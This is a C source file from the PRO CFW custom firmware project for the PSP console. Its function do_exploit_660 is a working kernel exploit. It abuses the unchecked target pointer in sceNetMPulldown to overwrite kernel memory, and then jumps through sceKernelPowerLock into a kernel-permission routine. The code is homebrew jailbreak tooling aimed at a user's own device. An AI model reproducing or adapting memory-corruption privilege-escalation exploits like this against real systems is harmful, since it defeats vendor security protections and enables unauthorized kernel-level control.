/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>
#include "utils.h"
#include "printk.h"
#include "../PXE/Launcher/launcher_patch_offset.h"

extern int sceKernelPowerLock(unsigned int, unsigned int);
int kernel_permission_call(void);

struct MPulldownExploit;

int sceNetMPulldown(struct MPulldownExploit *data, int unk1, int unk2, int unk3);

struct MPulldownExploit {
	u32 *data; // unk_data
	int unk1; // should be 0
	void *target;
	int target_size;
	u32 unk_data[80]; // embeeded it
};

void do_exploit_660(void)
{
	struct MPulldownExploit *ptr;
	int ret;
	u32 kernel_entry, entry_addr;
	u32 interrupts;

	sceUtilityLoadModule(1 + 0xFF);

	ptr = (void*)0x00010000; // use scratchpad memory to bypass check at @sceNet_Service@+0x00002D80
	memset(ptr, 0, sizeof(*ptr));
	ptr->data = ptr->unk_data;
	ptr->target_size = 1;
	ptr->target = (void*)(SYSMEM_TEXT_ADDR + g_offs->sysmem_patch.sceKernelPowerLockForUser - ptr->target_size);

	ptr->data[2] = (u32)(ptr->data);
	ptr->data[3] = 4;
	ptr->data[4*4+3] = 1;

	// sceNetMCopydata didn't check ptr->target validation
	ret = sceNetMPulldown(ptr, 0, 5, 0); // @sceNet_Service@+0x00003010
	printk("%s: -> 0x%08X\n", __func__, ret);
	sync_cache();

	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - g_offs->sysmem_patch.sceKernelPowerLockForUser_data_offset);
	pspSdkEnableInterrupts(interrupts);

	sceUtilityUnloadModule(1 + 0xFF);
}
